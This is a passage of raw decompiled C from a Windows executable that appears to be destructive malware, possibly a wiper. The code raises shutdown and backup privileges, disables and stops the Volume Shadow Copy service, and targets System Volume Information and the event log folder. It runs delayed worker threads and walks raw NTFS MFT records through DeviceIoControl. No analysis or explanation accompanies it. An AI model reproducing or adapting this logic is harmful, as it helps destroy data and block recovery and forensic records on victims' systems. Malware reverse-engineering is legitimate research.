  DWORD v20; // edi
  __int64 v21; // rdi
  HANDLE Thread; // eax
  void *v23; // ebx
  HANDLE v24; // eax
  int j; // esi
  DWORD v26; // esi
  int v27; // edi
  __int64 v28; // rdi
  _DWORD v29[173]; // [esp+0h] [ebp-7F8h]
  BOOL v30; // [esp+2B4h] [ebp-544h]
  PTOKEN_PRIVILEGES v31; // [esp+2B8h] [ebp-540h]
  DWORD v32; // [esp+2BCh] [ebp-53Ch]
  PTOKEN_PRIVILEGES v33; // [esp+2C0h] [ebp-538h]
  SIZE_T v34; // [esp+2C4h] [ebp-534h]
  int v35; // [esp+2D4h] [ebp-524h] BYREF
  struct _FILETIME TokenHandle; // [esp+2D8h] [ebp-520h] BYREF
  int v37; // [esp+2E0h] [ebp-518h] BYREF
  int v38; // [esp+2E4h] [ebp-514h] BYREF
  int pNumArgs; // [esp+2E8h] [ebp-510h] BYREF
  struct _FILETIME v40; // [esp+2ECh] [ebp-50Ch] BYREF
  int v41; // [esp+2F4h] [ebp-504h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+2F8h] [ebp-500h] BYREF
  int Parameter; // [esp+300h] [ebp-4F8h] BYREF
  unsigned int v44; // [esp+304h] [ebp-4F4h]
  WCHAR Name[10]; // [esp+308h] [ebp-4F0h] BYREF
  int v46; // [esp+31Ch] [ebp-4DCh]
  int v47; // [esp+320h] [ebp-4D8h]
  int v48; // [esp+324h] [ebp-4D4h]
  int v49; // [esp+328h] [ebp-4D0h]
  int v50; // [esp+32Ch] [ebp-4CCh]
  HANDLE hEvent[28]; // [esp+330h] [ebp-4C8h] BYREF
  WCHAR Filename[260]; // [esp+3A0h] [ebp-458h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+5A8h] [ebp-250h] BYREF

  v37 = 0;
  v38 = 0;
  v35 = 0;
  v41 = 0;
  memset(hEvent, 0, sizeof(hEvent));
  pNumArgs = 0;
  v0 = 0;
  CommandLineW = GetCommandLineW();
  if ( CommandLineW )
    v0 = CommandLineToArgvW(CommandLineW, &pNumArgs);
  SystemTimeAsFileTime = 0LL;
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v2 = 0;
  v3 = StrToIntW;
  if ( pNumArgs != 2 )
  {
    if ( pNumArgs != 3 )
      goto LABEL_8;
    v2 = v0[2];
  }
  if ( v0[1] )
  {
    v4 = StrToIntW(v0[1]);
    v3 = StrToIntW;
    v5 = v4;
    v40.dwLowDateTime = v4;
    goto LABEL_9;
  }
LABEL_8:
  v5 = 35;
  v40.dwLowDateTime = 35;
LABEL_9:
  if ( v2 )
    v6 = v3(v2);
  else
    v6 = 20;
  v7 = v5 >> 1;
  v34 = 64;
  if ( v6 <= v5 )
    v7 = v6;
  v44 = v7;
  ProcessHeap = GetProcessHeap();
  v9 = (char *)HeapAlloc(ProcessHeap, 8u, v34);
  wcscpy(Name, L"SeShutdo");
  v46 = 0;
  v47 = 7733353;
  v48 = 7077993;
  v49 = 6750309;
  v50 = 101;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 0x28u, (PHANDLE)&TokenHandle) )
  {
    if ( !GetModuleFileNameW(0, Filename, 0x104u) )
      wsprintfW(Filename, L"c*");
    FindFirstFileW(Filename, &FindFileData);
    v11 = GetLastError;
    GetLastError();
    CharLowerW(FindFileData.cFileName);
    v13 = FindFileData.cFileName[0];
    v29[2 * FindFileData.cFileName[0]] = 7209079;
    v29[2 * v13 + 1] = 7471184;
    LookupPrivilegeValueW(0, Name, (PLUID)(v9 + 4));
    LookupPrivilegeValueW(0, L"SeBackupPrivilege", (PLUID)v9 + 2);
    v34 = 0;
    v33 = 0;
    v32 = 0;
    v31 = (PTOKEN_PRIVILEGES)v9;
    *(_DWORD *)v9 = 2;
    v30 = 0;
    *((_DWORD *)v9 + 3) = 2;
    *((_DWORD *)v9 + 6) = 2;
    AdjustTokenPrivileges((HANDLE)TokenHandle.dwLowDateTime, v30, v31, v32, v33, (PDWORD)v34);
    if ( GetLastError() )
    {
LABEL_21:
      if ( sub_4029D0(&v37) )
      {
        v14 = 0;
        v15 = OpenSCManagerW(0, L"ServicesActive", 0xF003Fu);
        TokenHandle.dwLowDateTime = (DWORD)v15;
        if ( v15 )
        {
          v16 = OpenServiceW(v15, L"vss", 0x22u);
          v17 = v16;
          if ( v16 )
          {
            if ( !ChangeServiceConfigW(v16, 0x10u, 4u, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0, 0) )
              v14 = v11();
            ControlService(v17, 1u, 0);
            CloseServiceHandle(v17);
            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
          }
          else
          {
            v14 = v11();
            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
          }
        }
        else
        {
          v14 = v11();
        }
        SetLastError(v14);
        if ( GetModuleFileNameW(0, Filename, 0x104u) )
          sub_4023C0(Filename);
        for ( i = 0; i <= 100; ++i )
          sub_401D60(sub_401D10);
        sub_404BE0(L"C:\\System Volume Information", (int)&v38);
        dwHighDateTime = SystemTimeAsFileTime.dwHighDateTime;
        GetSystemTimeAsFileTime(&TokenHandle);
        v20 = 60000 * v40.dwLowDateTime;
        v21 = v20 - sub_401000(TokenHandle.dwLowDateTime - v20, TokenHandle.dwHighDateTime - dwHighDateTime, 10000, 0);
        if ( v21 < 0 )
          LODWORD(v21) = 0;
        Parameter = v21;
        TokenHandle.dwLowDateTime = (DWORD)CreateThread(0, 0, sub_403B40, &Parameter, 0, 0);
        hEvent[0] = CreateEventW(0, 1, 0, 0);
        Thread = CreateThread(0, 0, sub_4034D0, hEvent, 0, 0);
        v23 = Thread;
        if ( Thread && Thread != (HANDLE)-1 )
          SetThreadPriority(Thread, -2);
        sub_4027F0(&v37);
        v24 = CreateThread(0, 0, sub_402870, &v38, 0, 0);
        if ( v24 && v24 != (HANDLE)-1 )
          SetThreadPriority(v24, -2);
        for ( j = 0; j <= 100; ++j )
          sub_401D60(sub_401B80);
        sub_4038A0(sub_402290, &v35);
        sub_403620(sub_4028D0, &v35);
        sub_403620(sub_402890, &v35);
        sub_404BE0(L"\\\\?\\C:\\Windows\\System32\\winevt\\Logs", (int)&v35);
        v26 = SystemTimeAsFileTime.dwHighDateTime;
        GetSystemTimeAsFileTime(&v40);
        v27 = 60000 * v44;
        v28 = (unsigned int)v27 - sub_401000(v40.dwLowDateTime - v27, v40.dwHighDateTime - v26, 10000, 0);
        if ( v28 < 0 )
          LODWORD(v28) = 0;
        Sleep(v28);
        SetEvent(hEvent[0]);
        WaitForSingleObject(v23, 0x7530u);
        if ( !v23 || v23 == (void *)-1 )
          CloseHandle(v23);
        sub_4038A0(sub_401FE0, &v41);
        sub_4038A0(sub_402330, 0);
        sub_4027F0(&v35);
        sub_4027F0(&v41);
        if ( TokenHandle.dwLowDateTime )
        {
          if ( TokenHandle.dwLowDateTime != -1 )
            WaitForSingleObject((HANDLE)TokenHandle.dwLowDateTime, 0xFFFFFFFF);
        }
      }
      ExitProcess(0);
    }
    v34 = (SIZE_T)v9;
    v33 = 0;
    v12 = GetProcessHeap();
  }
  else
  {
    v11 = GetLastError;
    GetLastError();
    v34 = (SIZE_T)v9;
    v33 = 0;
    v12 = GetProcessHeap();
  }
  HeapFree(v12, (DWORD)v33, (LPVOID)v34);
  goto LABEL_21;
}
// 401000: using guessed type __int64 __stdcall sub_401000(_DWORD, _DWORD, _DWORD, _DWORD);
// 401B80: using guessed type int __stdcall sub_401B80(int, int, int, int, int, int);
// 401D10: using guessed type int __stdcall sub_401D10(int, int, int, int, int, int);
// 401D60: using guessed type _DWORD __stdcall sub_401D60(_DWORD);
// 402330: using guessed type int __stdcall sub_402330(int, int);
// 4027F0: using guessed type int __thiscall sub_4027F0(_DWORD);
// 4029D0: using guessed type int __thiscall sub_4029D0(_DWORD);
// 403620: using guessed type _DWORD __cdecl sub_403620(_DWORD, _DWORD);
// 4038A0: using guessed type int __fastcall sub_4038A0(_DWORD, _DWORD);
// 403B80: using guessed type void __noreturn start();

//----- (004040A0) --------------------------------------------------------
int __fastcall sub_4040A0(int a1, wint_t *a2, unsigned int a3)
{
  int v4; // edi
  unsigned int v5; // ecx
  unsigned int v6; // ebx
  wint_t *v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // edi
  int v12; // [esp+Ch] [ebp-4h]

  v4 = 0;
  v5 = a3;
  v6 = 0;
  v7 = a2;
  if ( a3 )
  {
    v8 = a1 - (_DWORD)a2;
    v12 = v8;
    do
    {
      if ( v4 )
        break;
      v9 = *(wint_t *)((char *)v7 + v8);
      if ( v9 != 46 && *v7 != 46 )
      {
        v10 = towupper(v9);
        v4 = v10 - towupper(*v7);
        v5 = a3;
      }
      v8 = v12;
      ++v6;
      ++v7;
    }
    while ( v6 < v5 );
  }
  return v4;
}

//----- (00404110) --------------------------------------------------------
int __fastcall sub_404110(unsigned int *a1, unsigned int a2, unsigned int a3, int a4, _DWORD *a5)
{
  unsigned int v6; // esi
  unsigned __int64 *i; // edi
  __int64 v8; // rax
  int v9; // et0
  unsigned int v11; // [esp+Ch] [ebp-8h]

  v6 = 0;
  v11 = a2;
  if ( !*a1 )
    return 0;
  for ( i = (unsigned __int64 *)(a1 + 6); ; i += 3 )
  {
    LODWORD(v8) = sub_401000(*i, a2);
    v9 = (__PAIR64__(a4, a3) - v8) >> 32;
    a3 -= v8;
    a4 = v9;
    if ( v9 < 0 )
      break;
    ++v6;
    a2 = v11;
    if ( v6 >= *a1 )
      return 0;
  }
  *a5 = a1[6 * v6 + 2];
  return 1;
}
// 404140: variable 'v8' is possibly undefined

//----- (00404180) --------------------------------------------------------
void __fastcall sub_404180(
        size_t a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int *a7,
        void (__stdcall *a8)(int, int))
{
  unsigned __int16 v8; // di
  int v9; // esi
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // edx
  int v13; // ecx
  char v14; // dl
  int v16; // eax
  int v17; // edx
  const wchar_t *v18; // ebx
  HANDLE v19; // eax
  wchar_t *v20; // eax
  wchar_t *v21; // edi
  void (__cdecl *v22)(wchar_t *, const wchar_t *, size_t); // ecx
  unsigned __int8 v23; // al
  int v24; // eax
  int v25; // eax
  int v26; // eax
  HANDLE v27; // eax
  int v28; // eax
  int v29; // edx
  int v30; // edi
  wchar_t *v31; // ebx
  unsigned __int8 v32; // dl
  HANDLE ProcessHeap; // eax
  wchar_t *v34; // eax
  HANDLE v35; // eax
  char Sourcea; // [esp+10h] [ebp-8h]
  wchar_t *Sourceb; // [esp+10h] [ebp-8h]
  size_t Count; // [esp+14h] [ebp-4h]
  size_t Counta; // [esp+14h] [ebp-4h]

  v8 = *(_WORD *)(a1 + 20);
  Count = a1;
  v9 = a1 + v8;
  if ( !v9 )
    return;
  while ( 1 )
  {
    v10 = v8 + 16;
    if ( v10 > *(_DWORD *)(a1 + 24) )
      return;
    if ( v10 > *a7 )
      return;
    if ( *(_DWORD *)v9 == -1 )
      return;
    if ( !*(_DWORD *)v9 )
      return;
    v11 = *(_DWORD *)(v9 + 4);
    if ( !v11 )
      return;
    v12 = v11 + v8;
    v13 = *(_DWORD *)v9;
    if ( v12 > *(_DWORD *)(Count + 24) || v12 > *a7 )
      return;
    v14 = *(_BYTE *)(v9 + 8);
    if ( v14 ? v11 < 0x40 : v11 < 0x18 )
      return;
    if ( v13 == a2 )
      break;
    v8 += v11;
    v9 += v11;
    if ( !v9 )
      return;
    a1 = Count;
  }
  if ( !v14 )
  {
    v28 = *(unsigned __int16 *)(v9 + 20);
    if ( !(_WORD)v28 )
      return;
    v29 = *(_DWORD *)(v9 + 16);
    if ( !v29 )
      return;
    if ( v13 != 32 )
    {
      a8(v9, (int)a7);
      return;
    }
    v30 = v28 + v9;
    if ( v28 + v9 + 26 > (unsigned int)(v9 + v28 + v29) )
      return;
    while ( 1 )
    {
      if ( *(_DWORD *)v30 == -1 || !*(_DWORD *)v30 || !*(_WORD *)(v30 + 4) )
        return;
      v31 = 0;
      v32 = *(_BYTE *)(v30 + 7);
      Counta = *(unsigned __int8 *)(v30 + 6);
      Sourceb = (wchar_t *)(v30 + v32);
      if ( !*(_BYTE *)(v30 + 6) || !v32 || !*(_WORD *)(v30 + v32) )
        goto LABEL_55;
      ProcessHeap = GetProcessHeap();
      v34 = (wchar_t *)HeapAlloc(ProcessHeap, 0, 2 * Counta + 2);
      v31 = v34;
      if ( v34 )
        break;
      ++a7[12];
LABEL_57:
      v30 += *(unsigned __int16 *)(v30 + 4);
      if ( v30 + 26 > v9 + *(_DWORD *)(v9 + 16) + (unsigned int)*(unsigned __int16 *)(v9 + 20) )
        return;
    }
    wcsncpy(v34, Sourceb, Counta);
    v31[Counta] = 0;
LABEL_55:
    sub_4044E0(*(_DWORD *)(v30 + 16), *(unsigned __int16 *)(v30 + 20), *(unsigned __int16 *)(v30 + 24), a7, a8);
    if ( v31 )
    {
      v35 = GetProcessHeap();
      HeapFree(v35, 0, v31);
    }
    goto LABEL_57;
  }
  Sourcea = v13 == 32;
  v16 = 0;
  if ( Source )
  {
    v17 = 0;
    do
    {
      if ( dword_407008[v17] == v13 )
        break;
      ++v16;
      v17 = 2 * v16;
    }
    while ( (&Source)[2 * v16] );
  }
  v18 = (&Source)[2 * v16];
  if ( v18 )
  {
    v19 = GetProcessHeap();
    v20 = (wchar_t *)HeapAlloc(v19, 0, 0x20Au);
    v21 = v20;
    if ( !v20 )
    {
      ++a7[12];
      return;
    }
    v22 = (void (__cdecl *)(wchar_t *, const wchar_t *, size_t))wcsncpy;
    *v20 = 0;
    v23 = *(_BYTE *)(v9 + 9);
    if ( v23 )
    {
      wcsncpy(v21, (const wchar_t *)(v9 + *(unsigned __int16 *)(v9 + 10)), v23);
      v21[*(unsigned __int8 *)(v9 + 9)] = 0;
      if ( *v21 )
      {
LABEL_28:
        v24 = wcscmp(v21, L"$DATA");
        if ( v24 )
          v24 = v24 < 0 ? -1 : 1;
        if ( !v24 )
          *v21 = 0;
        v25 = wcscmp(v21, L"$I30");
        if ( v25 )
          v25 = v25 < 0 ? -1 : 1;
        if ( !v25 )
          *v21 = 0;
        v26 = wcscmp(v21, L"$INDEX_ALLOCATION");
        if ( v26 )
          v26 = v26 < 0 ? -1 : 1;
        if ( !v26 )
          *v21 = 0;
        sub_4045D0(v9, (int)a7, Sourcea, a8);
        v27 = GetProcessHeap();
        HeapFree(v27, 0, v21);
        return;
      }
      v22 = (void (__cdecl *)(wchar_t *, const wchar_t *, size_t))wcsncpy;
    }
    v22(v21, v18, 0x104u);
    v21[259] = 0;
    goto LABEL_28;
  }
}
// 4044E0: using guessed type _DWORD __cdecl sub_4044E0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4057AC: using guessed type wchar_t aData[6];
// 4057D0: using guessed type wchar_t aIndexAllocatio[18];
// 405854: using guessed type wchar_t aI30[5];
// 407008: using guessed type int dword_407008[];

//----- (004044E0) --------------------------------------------------------
_DWORD *__cdecl sub_4044E0(int a1, int a2, int a3, int a4, void (__stdcall *a5)(int, int))
{
  int v5; // ecx
  HANDLE ProcessHeap; // eax
  _DWORD *result; // eax
  _DWORD *v8; // esi
  HANDLE v9; // eax
  HANDLE v10; // eax
  HANDLE v11; // eax
  int v12; // [esp-18h] [ebp-38h]
  int v13; // [esp-14h] [ebp-34h]
  int v14; // [esp-10h] [ebp-30h]
  int v15; // [esp-Ch] [ebp-2Ch]
  SIZE_T v16; // [esp-4h] [ebp-24h]
  size_t v17; // [esp-4h] [ebp-24h]
  int v18; // [esp+10h] [ebp-10h]
  DWORD BytesReturned; // [esp+14h] [ebp-Ch] BYREF
  _DWORD InBuffer[2]; // [esp+18h] [ebp-8h] BYREF

  v18 = v5;
  v16 = *(_DWORD *)(a4 + 4);
  ProcessHeap = GetProcessHeap();
  result = HeapAlloc(ProcessHeap, 0, v16);
  v8 = result;
  if ( !result )
    goto LABEL_11;
  v17 = *(_DWORD *)(a4 + 4);
  InBuffer[0] = a1;
  InBuffer[1] = a2;
  memset(result, 0, v17);
  if ( !DeviceIoControl(*(HANDLE *)(a4 + 40), 0x90068u, InBuffer, 8u, v8, *(_DWORD *)(a4 + 4), &BytesReturned, 0) )
  {
    GetLastError();
LABEL_4:
    v9 = GetProcessHeap();
    return (_DWORD *)HeapFree(v9, 0, v8);
  }
  if ( *v8 != a1 || *((unsigned __int16 *)v8 + 2) != a2 )
  {
    v11 = GetProcessHeap();
    result = (_DWORD *)HeapFree(v11, 0, v8);
LABEL_11:
    ++*(_DWORD *)(a4 + 48);
    return result;
  }
  if ( v8[3] != 1162627398 || (*((_BYTE *)v8 + 34) & 1) == 0 )
    goto LABEL_4;
  sub_404180((size_t)(v8 + 3), v18, v12, v13, v14, v15, (unsigned int *)a4, a5);
  v10 = GetProcessHeap();
  return (_DWORD *)HeapFree(v10, 0, v8);
}
// 4044F5: variable 'v5' is possibly undefined
// 404597: variable 'v12' is possibly undefined
// 404597: variable 'v13' is possibly undefined
// 404597: variable 'v14' is possibly undefined
// 404597: variable 'v15' is possibly undefined

//----- (004045D0) --------------------------------------------------------
char __usercall sub_4045D0@<al>(int a1@<edx>, int a2, char a3, void (__stdcall *a4)(int, int))
{
  unsigned int v5; // eax
  unsigned __int8 *v6; // edx
  int v7; // ebx
  int v8; // esi
  unsigned int v9; // edi
  unsigned int v10; // ecx
  int v11; // esi
  unsigned int v12; // edi
  unsigned int v13; // kr00_4
  int v14; // kr04_4
  bool v15; // cf
  int v16; // esi
  int v17; // ecx
  unsigned int v18; // edi
  int v19; // kr20_4
  __int64 v20; // kr28_8
  int v21; // eax
  __int64 v22; // kr30_8
  unsigned int v23; // ebx
  unsigned int v24; // edx
  unsigned int v25; // edi
  int v26; // ebx
  unsigned __int8 *v27; // ecx
  int v28; // edx
  int v31; // [esp+14h] [ebp-30h]
  int v32; // [esp+1Ch] [ebp-28h]
  int v33; // [esp+24h] [ebp-20h]
  unsigned int v34; // [esp+28h] [ebp-1Ch]
  int v35; // [esp+2Ch] [ebp-18h]
  unsigned int v36; // [esp+30h] [ebp-14h]
  unsigned int v37; // [esp+34h] [ebp-10h]
  unsigned __int8 *v38; // [esp+38h] [ebp-Ch]
  char v39; // [esp+3Eh] [ebp-6h]
  unsigned __int8 v40; // [esp+3Fh] [ebp-5h]
  unsigned int v41; // [esp+50h] [ebp+Ch]
  unsigned __int8 v42; // [esp+53h] [ebp+Fh]

  if ( a3 || (LOBYTE(v5) = a2, (*(_BYTE *)(a2 + 44) & 2) != 0) )
  {
    v6 = (unsigned __int8 *)(a1 + *(unsigned __int16 *)(a1 + 32));
    v32 = *(_DWORD *)(a1 + 16);
    v5 = *(_DWORD *)(a1 + 20);
    v34 = v5;
    v38 = v6;
    v42 = *v6;
    if ( *v6 )
    {
      LOBYTE(v5) = *v6;
      v36 = 0;
      v40 = *v6;
      v37 = 0;
      do
      {
        v7 = v5 & 0xF;
        v39 = (unsigned __int8)v5 >> 4;
        v8 = (unsigned __int8)v5 >> 4;
        if ( (unsigned __int8)v5 >> 4 )
        {
          v9 = (unsigned __int64)(char)v6[v8 + v7] >> 32;
          v10 = (char)v6[v8 + v7];
          v6 = v38;
          LOBYTE(v5) = v40;
        }
        else
        {
          v9 = 0;
          v10 = 0;
        }
        v31 = v7 + v8;
        v11 = v7 + v8 - 1;
        v35 = v11;
        if ( v11 > v7 )
        {
          do
          {
            v12 = __PAIR64__(v9, v10) >> 24;
            v13 = v6[v11];
            v14 = v10 << 8;
            v10 = (v10 << 8) + v13;
            v9 = ((unsigned int)v14 + __PAIR64__(v12, v13)) >> 32;
            v6 = v38;
            --v11;
          }
          while ( v11 > v7 );
          LOBYTE(v5) = v42;
        }
        v15 = __CFADD__(v10, v37);
        v37 += v10;
        v36 += v9 + v15;
        v16 = 0;
        v17 = v5 & 0xF;
        if ( (v5 & 0xF) != 0 )
        {
          v18 = 0;
          do
          {
            v19 = (v16 << 8) + v38[v17];
            v18 = ((__PAIR64__(v18, v16) << 8) + v38[v17]) >> 32;
            v16 = v19;
            --v17;
          }
          while ( v17 );
          v41 = v18;
          v33 = v19;
        }
        else
        {
          v41 = 0;
          v33 = 0;
        }
        if ( v39 )
          v20 = (char)v38[v31];
        else
          v20 = 0LL;
        v21 = v35;
        if ( v35 > v7 )
        {
          do
          {
            v22 = v38[v21] + (v20 << 8);
            v21 = v35 - 1;
            v35 = v21;
            v20 = v22;
          }
          while ( v21 > v7 );
          v16 = v33;
        }
        if ( v20 )
        {
          LOBYTE(v5) = a2;
          v23 = *(_DWORD *)(a2 + 20);
          v24 = *(_DWORD *)(a2 + 16);
          if ( v36 > v23 )
            return v5;
          LOBYTE(v5) = v37;
          if ( v36 >= v23 && v37 >= v24 )
            return v5;
          v25 = v41;
          v5 = (__PAIR64__(v41, v37) + __PAIR64__(v36, v16)) >> 32;
          if ( __PAIR64__(v41, v37) + __PAIR64__(v36, v16) > __PAIR64__(v23, v24) )
            return v5;
        }
        else
        {
          v25 = v41;
        }
        v26 = v32;
        *(_DWORD *)(a2 + 80) = v37;
        *(_DWORD *)(a2 + 84) = v36;
        *(_DWORD *)(a2 + 96) = v16;
        *(_DWORD *)(a2 + 100) = v25;
        *(_DWORD *)(a2 + 88) = v32;
        *(_DWORD *)(a2 + 92) = v34;
        a4(a1, a2);
        v5 = *v38;
        v27 = &v38[v5 & 0xF];
        v28 = (v5 >> 4) + 1;
        BYTE1(v5) = v27[v28];
        v6 = &v27[v28];
        v42 = BYTE1(v5);
        v38 = v6;
        LOBYTE(v5) = BYTE1(v5);
        v32 += v16;
        v34 += v25 + __CFADD__(v16, v26);
        v40 = BYTE1(v5);
      }
      while ( BYTE1(v5) );
    }
  }
  return v5;
}

//----- (004047D0) --------------------------------------------------------
unsigned int *__stdcall sub_4047D0(unsigned int *a1, _DWORD *a2)
{
  unsigned int *result; // eax
  unsigned int v3; // edx
  int v4; // ebx
  unsigned __int64 *v5; // edi
  unsigned __int64 *i; // esi
  __int64 v7; // rax
  _DWORD *v8; // eax
  unsigned int v9; // esi
  int v10; // ecx
  unsigned int v11; // ebx
  unsigned int v12; // ecx
  unsigned int v13; // eax
  __int64 v14; // rax
  int v15; // et0
  SIZE_T v16; // ebx
  unsigned int v17; // edi
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // [esp-10h] [ebp-38h]
  int v20; // [esp-8h] [ebp-30h]
  unsigned int *v21; // [esp+Ch] [ebp-1Ch]
  __int64 v22; // [esp+10h] [ebp-18h]
  _DWORD *v23; // [esp+10h] [ebp-18h]
  int v24; // [esp+14h] [ebp-14h]
  unsigned int v25; // [esp+18h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-10h]
  unsigned int v27; // [esp+1Ch] [ebp-Ch]
  unsigned int v28; // [esp+20h] [ebp-8h]
  unsigned int v29; // [esp+24h] [ebp-4h]

  result = a1;
  if ( *a1 == 128 )
  {
    result = (unsigned int *)a2[19];
    v3 = a2[6];
    v29 = a2[20];
    LODWORD(v22) = v29;
    v4 = 0;
    v25 = v3;
    v21 = result;
    v28 = a2[21];
    HIDWORD(v22) = v28;
    if ( *result )
    {
      v5 = (unsigned __int64 *)(result + 6);
      for ( i = (unsigned __int64 *)(result + 6); ; i += 3 )
      {
        LODWORD(v7) = sub_401000(*i, v3);
        v22 -= v7;
        if ( v22 < 0 )
          break;
        result = v21;
        if ( ++v4 >= *v21 )
          return result;
        v3 = v25;
      }
      v8 = a2;
      v9 = 0;
      v23 = 0;
      v10 = a2[21];
      ++a2[14];
      v11 = a2[20];
      v24 = v10;
      if ( *(_DWORD *)a2[19] )
      {
        v12 = a2[6];
        v13 = a2[7];
        v27 = v12;
        v26 = v13;
        while ( 1 )
        {
          LODWORD(v14) = sub_4010F0(*v5, __SPAIR64__(v13, v12));
          v15 = (__PAIR64__(v24, v11) - v14) >> 32;
          v11 -= v14;
          v24 = v15;
          if ( v15 < 0 )
            break;
          ++v9;
          v12 = v27;
          v5 += 3;
          v13 = v26;
          if ( v9 >= *v21 )
            goto LABEL_13;
        }
        v23 = (_DWORD *)v21[6 * v9 + 2];
LABEL_13:
        v8 = a2;
      }
      v16 = v8[6];
      v17 = v8[7];
      v20 = v8[9];
      v19 = sub_4010B0(*((_QWORD *)v8 + 12), *((_QWORD *)v8 + 3));
      v18 = sub_4010B0(__SPAIR64__(v17, v16), __SPAIR64__(v28, v29));
      return sub_401590(a2[18], v23, *(_QWORD *)&v21[6 * v9 + 4] + v18, v19, v20, v16);
    }
  }
  return result;
}
// 404834: variable 'v7' is possibly undefined
// 404893: variable 'v14' is possibly undefined

//----- (00404920) --------------------------------------------------------
unsigned int __stdcall sub_404920(int a1, int a2)
{
  int v2; // edx
  unsigned int result; // eax
  _WORD *v4; // edi
  _WORD *v5; // ecx
  int v7; // edi
  int v8; // ecx
  unsigned int v9; // esi
  int v10; // edx
  _DWORD *v11; // [esp+Ch] [ebp-4h]

  v2 = a1;
  result = 0;
  if ( *(_BYTE *)(a1 + 8) )
    v2 = 0;
  if ( v2 && *(_DWORD *)v2 == 144 )
  {
    v4 = *(_WORD **)(a2 + 52);
    if ( v4 )
    {
      v5 = v4 + 1;
      while ( *v4++ )
        ;
      v7 = v4 - v5;
    }
    else
    {
      v7 = 0;
    }
    v8 = v2 + *(unsigned __int16 *)(v2 + 20);
    v9 = *(_DWORD *)(v8 + 16) + v8 + 16;
    result = v8 + *(_DWORD *)(v8 + 20) + 16;
    v11 = (_DWORD *)result;
    if ( v9 < result )
    {
      do
      {
        if ( (*(_BYTE *)(v9 + 12) & 2) != 0 )
          break;
        if ( !v7
          || v7 == *(unsigned __int8 *)(v9 + 80)
          && !sub_4040A0(*(_DWORD *)(a2 + 52), (wint_t *)(v9 + 82), *(unsigned __int8 *)(v9 + 80)) )
        {
          v10 = *(unsigned __int16 *)(v9 + 4);
          if ( v10 | *(_DWORD *)v9 )
          {
            result = (unsigned int)sub_4044E0(
                                     *(_DWORD *)v9,
                                     v10,
                                     *(_DWORD *)v9,
                                     a2,
                                     (void (__stdcall *)(int, int))sub_4047D0);
            if ( v7 )
              break;
          }
        }
        result = *(unsigned __int16 *)(v9 + 8);
        v9 += result;
      }
      while ( v9 < (unsigned int)v11 );
    }
  }
  return result;
}

//----- (004049F0) --------------------------------------------------------
char *__stdcall sub_4049F0(char *a1, _DWORD *a2)
{
  char *result; // eax
  SIZE_T v3; // esi
  HANDLE ProcessHeap; // eax
  void *v5; // edi
  _WORD *v6; // edi
  _WORD *v7; // ecx
  int v9; // edi
  char *v10; // eax
  int v11; // ecx
  int v12; // edx
  char *v13; // esi
  DWORD v14; // esi
  HANDLE v15; // eax
  char *v16; // [esp+4h] [ebp-1Ch]
  char *v17; // [esp+8h] [ebp-18h]
  int v18; // [esp+Ch] [ebp-14h]
  int v19; // [esp+10h] [ebp-10h]
  char *lpBuffer; // [esp+18h] [ebp-8h]
  DWORD NumberOfBytesRead; // [esp+1Ch] [ebp-4h] BYREF

  result = a1;
  if ( !a1[8] )
    result = 0;
  if ( result )
  {
    if ( *(_DWORD *)result == 160 )
    {
      v19 = 0;
      v3 = a2[6] * a2[24];
      ProcessHeap = GetProcessHeap();
      result = (char *)HeapAlloc(ProcessHeap, 8u, v3);
      lpBuffer = result;
      if ( result )
      {
        v5 = (void *)a2[10];
        if ( SetFilePointerEx(
               v5,
               (LARGE_INTEGER)((unsigned int)a2[9] * (unsigned __int64)(unsigned int)(a2[8] * a2[20])),
               0,
               0)
          && ReadFile(v5, lpBuffer, v3, &NumberOfBytesRead, 0) )
        {
          v6 = (_WORD *)a2[13];
          if ( v6 )
          {
            v7 = v6 + 1;
            while ( *v6++ )
              ;
            v9 = v6 - v7;
          }
          else
          {
            v9 = 0;
          }
          v10 = lpBuffer;
          v16 = lpBuffer;
          v17 = &lpBuffer[v3];
          v11 = 0;
          v12 = 0;
          if ( lpBuffer < &lpBuffer[v3] )
          {
            v13 = &lpBuffer[v3];
            v18 = 0;
            do
            {
              if ( a2[13] && a2[14] )
                break;
              if ( *(_DWORD *)v10 == 1480871497 )
              {
                v14 = (DWORD)&v16[*((_DWORD *)v10 + 6) + 24];
                v10 = v16;
                if ( v14 <= (unsigned int)v17 )
                {
                  v11 = v18;
                  for ( NumberOfBytesRead = (DWORD)&v16[*((_DWORD *)v16 + 7) + 24];
                        v14 < NumberOfBytesRead;
                        v14 += *(unsigned __int16 *)(v14 + 8) )
                  {
                    if ( (*(_BYTE *)(v14 + 12) & 2) != 0 )
                      break;
                    if ( v9 )
                    {
                      if ( v9 != *(unsigned __int8 *)(v14 + 80) )
                        continue;
                      if ( sub_4040A0(a2[13], (wint_t *)(v14 + 82), *(unsigned __int8 *)(v14 + 80)) )
                      {
                        v11 = v18;
LABEL_28:
                        v12 = v19;
                        continue;
                      }
                    }
                    v12 = *(_DWORD *)v14;
                    v11 = *(unsigned __int16 *)(v14 + 4);
                    v19 = *(_DWORD *)v14;
                    v18 = v11;
                    if ( __PAIR64__(v11, *(_DWORD *)v14) )
                    {
                      sub_4044E0(v12, v11, v11, (int)a2, (void (__stdcall *)(int, int))sub_4047D0);
                      v11 = v18;
                      if ( v9 )
                        goto LABEL_35;
                      goto LABEL_28;
                    }
                  }
                  v10 = v16;
                }
                v13 = v17;
              }
              v10 += a2[6];
              v16 = v10;
            }
            while ( v10 < v13 );
          }
        }
        else
        {
          GetLastError();
          v11 = 0;
LABEL_35:
          v12 = v19;
        }
        if ( a2[13] )
        {
          a2[16] = v12;
          a2[17] = v11;
        }
        v15 = GetProcessHeap();
        return (char *)HeapFree(v15, 0, lpBuffer);
      }
    }
  }
  return result;
}

//----- (00404BE0) --------------------------------------------------------
